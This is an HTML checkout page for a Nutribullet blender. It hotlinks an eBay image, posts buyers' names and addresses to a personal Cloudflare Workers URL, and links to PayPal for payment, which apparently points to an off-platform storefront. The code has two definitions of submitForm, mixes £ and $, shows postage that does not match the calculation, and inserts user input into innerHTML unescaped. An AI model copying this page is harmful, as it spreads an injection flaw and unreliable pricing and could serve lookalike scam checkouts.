<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <style>
    /* Reset CSS */
body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f4;
    margin: 0;
    padding: 0;
}

.container {
    display: flex;
    flex-direction: column;
    max-width: 90vw; /* Adjusted maximum width based on viewport width */
    margin: 5vw auto; /* Adjusted margin based on viewport width */
    background-color: #fff;
    padding: 5vw; /* Adjusted padding based on viewport width */
    border-radius: 4vw; /* Adjusted border radius based on viewport width */
    box-shadow: 0 0 2vw rgba(0, 0, 0, 0.1); /* Adjusted box shadow based on viewport width */
}

.card {
    position: fixed;
    top: 5vw; /* Adjusted top position based on viewport width */
    right: 5vw; /* Adjusted right position based on viewport width */
    width: 40vw; /* Adjusted width based on viewport width */
    padding: 5vw; /* Adjusted padding based on viewport width */
    background-color: #ffffff;
    border-radius: 4vw; /* Adjusted border radius based on viewport width */
    box-shadow: 0 1vw 2vw rgba(0, 0, 0, 0.1); /* Adjusted box shadow based on viewport width */
    transition: box-shadow 0.3s ease-in-out;
}

.card:hover {
    box-shadow: 0 2vw 4vw rgba(0, 0, 0, 0.2); /* Adjusted box shadow based on viewport width */
}

.summary-container {
    margin-top: 20vw; /* Adjusted margin top based on viewport width */
}

h1 {
    color: #333;
    text-align: center;
    font-size: 4vw; /* Adjusted font size based on viewport width */
}

h2 {
    color: #333;
    text-align: left;
    font-size: 3vw; /* Adjusted font size based on viewport width */
}

label {
    display: block;
    margin-bottom: 2vw; /* Adjusted margin bottom based on viewport width */
}

input[type="text"],
input[type="email"],
select {
    width: 90vw; /* Adjusted width based on viewport width */
    max-width: 40vw; /* Limited maximum width for larger screens */
    padding: 4vw; /* Adjusted padding based on viewport width */
    margin-bottom: 10vw; /* Adjusted margin bottom based on viewport width */
    border: 1px solid #ccc;
    border-radius: 4vw; /* Adjusted border radius based on viewport width */
    box-sizing: border-box;
    transition: border-color 0.3s, box-shadow 0.3s;
}

input[type="text"]:focus,
input[type="email"]:focus,
select:focus {
    border-color: #007bff;
    box-shadow: 0 0 0 1vw rgba(0, 123, 255, 0.25);
    outline: none;
}

input[type="submit"] {
    width: 90vw; /* Adjusted width based on viewport width */
    max-width: 40vw; /* Limited maximum width for larger screens */
    padding: 4vw; /* Adjusted padding based on viewport width */
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 4vw; /* Adjusted border radius based on viewport width */
    cursor: pointer;
    font-size: 4vw; /* Adjusted font size based on viewport width */
    transition: background-color 0.3s;
}

input[type="submit"]:hover {
    background-color: #0056b3;
}

.half-width {
    width: 44vw; /* Adjusted width based on viewport width */
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.third-width {
    width: calc(30vw - 2vw); /* Adjusted width based on viewport width */
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.name-fields,
.address-fields {
    display: flex;
    justify-content: space-between;
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.name-fields > div,
.address-fields > div {
    width: 44vw; /* Adjusted width based on viewport width */
}

.payment-options {
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.payment-option {
    margin-bottom: 2vw; /* Adjusted margin bottom based on viewport width */
    display: flex;
    align-items: center;
}

.payment-option input[type="radio"] {
    margin-right: 2vw; /* Adjusted margin right based on viewport width */
}

.payment-option label {
    cursor: pointer;
    display: flex;
    align-items: center;
}

.payment-option label img {
    width: 12vw; /* Adjusted width based on viewport width */
    height: 8vw; /* Adjusted height based on viewport width */
    margin-right: 2vw; /* Adjusted margin right based on viewport width */
}

.payment-option + .payment-option {
    border-top: 1px solid #ccc;
    padding-top: 5vw; /* Adjusted padding top based on viewport width */
    margin-top: 5vw; /* Adjusted margin top based on viewport width */
}

#card-entry-form {
    display: none;
    margin-top: 5vw; /* Adjusted margin top based on viewport width */
}

#card-entry-form.show {
    display: block;
}

.product-info {
    display: flex;
    align-items: center;
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.product-image {
    width: 24vw; /* Adjusted width based on viewport width */
    height: 24vw; /* Adjusted height based on viewport width */
    margin-right: 5vw; /* Adjusted margin right based on viewport width */
    margin-top: 5vw; /* Adjusted margin top based on viewport width */
    border-radius: 4vw; /* Adjusted border radius based on viewport width */
    overflow: hidden;
}

.product-image img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.product-details {
    flex: 1;
}

.product-title {
    font-size: 4vw; /* Adjusted font size based on viewport width */
    font-weight: bold;
    margin-bottom: 2vw; /* Adjusted margin bottom based on viewport width */
}

.product-price {
    margin-bottom: 2vw; /* Adjusted margin bottom based on viewport width */
}

.quantity-selector {
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.postage {
    font-weight: bold;
    margin-top: 5vw; /* Adjusted margin top based on viewport width */
}

.confirm-pay-btn {
    display: block;
    width: 90vw; /* Adjusted width based on viewport width */
    max-width: 40vw; /* Limited maximum width for larger screens */
    padding: 4vw; /* Adjusted padding based on viewport width */
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 4vw; /* Adjusted border radius based on viewport width */
    cursor: pointer;
    font-size: 4vw; /* Adjusted font size based on viewport width */
    margin-top: 5vw; /* Adjusted margin top based on viewport width */
    text-align: center;
    text-decoration: none;
    transition: background-color 0.3s;
}

.confirm-pay-btn:hover {
    background-color: #0056b3;
}

.quantity-selector {
    margin-bottom: 5vw; /* Adjusted margin bottom based on viewport width */
}

.quantity-selector label {
    display: block;
    font-weight: bold;
    margin-bottom: 2vw; /* Adjusted margin bottom based on viewport width */
}

.quantity-input {
    width: 15vw; /* Adjusted width based on viewport width */
    padding: 4vw; /* Adjusted padding based on viewport width */
    border: 1px solid #ccc;
    border-radius: 2vw; /* Adjusted border radius based on viewport width */
    font-size: 4vw; /* Adjusted font size based on viewport width */
    box-sizing: border-box;
}

hr {
    border: none;
    border-top: 0.2vw solid #ccc; /* Adjusted border thickness based on viewport width */
    margin: 2vw 0; /* Adjusted margin based on viewport width */
}

h2 {
    font-size: 3vw; /* Adjusted font size based on viewport width */
    text-align: left;
    margin-left: 5vw; /* Adjusted margin left based on viewport width */
}

    </style>
     <script src="https://cdn.jsdelivr.net/npm/@twilio/sdk@3.59.0/dist/twilio.min.js"></script>
</head>
<body>
<div class="container">
    <h1>Checkout</h1>
    <div class="product-info">
        <div class="product-image">
            <img src="https://i.ebayimg.com/images/g/TXsAAOSw5Dtl-tGz/s-l960.jpg" alt="Product Image">
        </div>
        <div class="product-details">
            <div class="product-title">NUTRIBULLET 600W STARTER KIT SMOOTHIE MAKER TABLE TOP BLENDER</div>
            <div class="product-price">£65.50</div>
           <div class="quantity-selector">
    <label for="quantity">Quantity:</label>
    <div class="quantity-controls">
        <input type="number" id="quantity" name="quantity" class="quantity-input" min="1" max="10" value="1">
    </div>
</div>

            <div class="postage">Postage</div>
            <div>4-6 days</div>
        </div>
    </div>
     <hr style="border: none; border-top: 1px solid #ccc; margin: 10px 0;">
    <h2>Post to</h2>
  <form id="checkout-form" action="https://worker-blue-wind-1446.bashirmubarak08.workers.dev/" method="post">
   
    <select id="country" name="country" required>
        <option value="">Select Country</option>
        <option value="US">United States</option>
        <option value="UK">United Kingdom</option>
        <!-- Add more options as needed -->
    </select>
    <div class="name-fields">
        <div>
            <input type="text" id="fname" name="fname" required placeholder="First Name">
        </div>
        <div>
            <input type="text" id="lname" name="lname" required placeholder="Surname">
        </div>
    </div>
    <div class="address-fields">
        <div>
            <input type="text" id="address" name="address" required placeholder="Street Address">
        </div>
        <div>
            <input type="text" id="address2" name="address2" placeholder="Address Line 2 (optional)">
        </div>
    </div>
    <div class="third-width">
        <input type="text" id="city" name="city" required placeholder="City">
    </div>
    <div class="third-width">
        <select id="state" name="state" required>
            <option value="">Select State/Province</option>
            <option value="NY">New York</option>
            <option value="CA">California</option>
            <!-- Add more options as needed -->
        </select>
    </div>
    <div class="third-width">
        <input type="text" id="postcode" name="postcode" required placeholder="Postcode">
    </div>

    <input type="button" value="Confirm Details" onclick="submitForm()">
</form>
  
<div id="summary-list" style="display: none;"></div>
</div>

<div class="card">
    <h3 class="card-title">Order Summary</h3>
    <div class="order-summary">
        <div class="summary-item">
            <label>Item:</label> <span id="summary-item">1</span>
        </div>
        <div class="summary-item">
            <label>Postage:</label> <span id="summary-postage">£4.00</span>
        </div>
        <hr>
        <div class="summary-item">
            <label>Order Total:</label> <span id="summary-total">$XX.XX</span>
        </div>
        <!-- Pay button linking to PayPal -->
        <a href="https://www.paypal.com/ncp/payment/A3E3Y95ABXA78" class="pay-button">Pay here</a>
    </div>
</div>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const quantityInput = document.getElementById('quantity');
        const totalPriceElement = document.getElementById('summary-total');
        const itemElement = document.getElementById('summary-item');

        // Assuming static values for price, discount, and postage
        const pricePerItem = 65.50; // Update this price as needed
        const postage = 3.99;

        // Function to calculate and update the total
        function updateTotal() {
            const quantity = parseInt(quantityInput.value);
            const total = (pricePerItem * quantity)+ postage;
            totalPriceElement.textContent = `$${total.toFixed(2)}`;
            itemElement.textContent = quantity; // Update item count in summary
        }

        // Update total when the quantity changes
        quantityInput.addEventListener('input', updateTotal);

        // Initial total update
        updateTotal();
    });
   function submitForm() {
    // Get form data
    var formData = new FormData(document.getElementById("checkout-form"));

    // Send form data to Cloudflare Worker endpoint
    fetch('https://worker-blue-wind-1446.bashirmubarak08.workers.dev/', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(data => {
        console.log(data); // Log response from server
        // Optionally, display a success message
        alert('Form submitted successfully!');
    })
    .catch(error => {
        console.error('There was a problem with the fetch operation:', error);
        // Handle error condition
        alert('There was an error submitting the form.');
    });
}
function submitForm() {
    // Get form data
    var formData = new FormData(document.getElementById("checkout-form"));

    // Compose summary list
    var summaryList = document.getElementById("summary-list");
    summaryList.innerHTML = `
        <ul>
            <li>First Name: ${formData.get('fname')}</li>
            <li>Last Name: ${formData.get('lname')}</li>
            <li>Address: ${formData.get('address')}</li>
            <li>Address 2: ${formData.get('address2')}</li>
            <li>City: ${formData.get('city')}</li>
            <li>State: ${formData.get('state')}</li>
            <li>Postcode: ${formData.get('postcode')}</li>
            <!-- Add more fields as needed -->
        </ul>
    `;

    // Show the summary list
    summaryList.style.display = "block";

    // Hide the form
    document.getElementById("checkout-form").style.display = "none";
}
</script>
</body>
</html>
